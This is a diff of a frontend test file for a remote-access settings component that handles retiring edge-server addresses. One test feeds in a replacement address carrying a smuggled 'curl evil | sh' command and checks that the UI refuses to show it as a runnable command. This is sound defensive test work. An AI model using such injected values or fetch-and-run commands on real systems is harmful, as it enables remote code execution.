@@ -242,17 +242,18 @@ describe('a retiring or retired edge address', () => {
     seed('super_admin', { ...claimed, pending: { ...pending, replacement: 'https://x.example.test; curl evil | sh', first_use: true } })
     render(<RemoteAccessSection client={api()} />)
     const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(/first connection to the edge/)).toBeTruthy()
     expect(callout.getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
     expect(callout.queryByText(/systemctl|cloudfield-server/)).toBeNull()
   })
 
   it.each([
-    ['with', { state: 'retiring', replacement, restart_pending: true } as const, `${edgeURL} is retiring; the edge recommends ${replacement}. `],
+    ['with', { state: 'retiring', replacement, restart_pending: true } as const, ` ${edgeURL} is retiring; the edge recommends ${replacement}.`],
     ['without', undefined, ''],
-  ])('tells other members a pending change is to a leaving address, %s a notice for the running one', (_, notice, prefix) => {
-    seed('collaborator', { ...claimed, notice, pending: { state: 'retiring' } })
+  ])('tells other members a pending change is to a leaving address, %s a notice for the running one', (_, notice, running) => {
+    seed('collaborator', { ...claimed, notice, pending: { state: 'retiring', date: '2027-04-01' } })
     render(<RemoteAccessSection client={api()} />)
-    expect(screen.getByText(`${prefix}A change of the server's edge address is configured and waits for a restart, and that address is itself retiring.`)).toBeTruthy()
+    expect(screen.getByText(`The address edge-url names for the next restart is retiring on 2027-04-01. A super admin moves the server.${running}`)).toBeTruthy()
     expect(screen.queryByText(/cloudfield-server/)).toBeNull()
   })
 
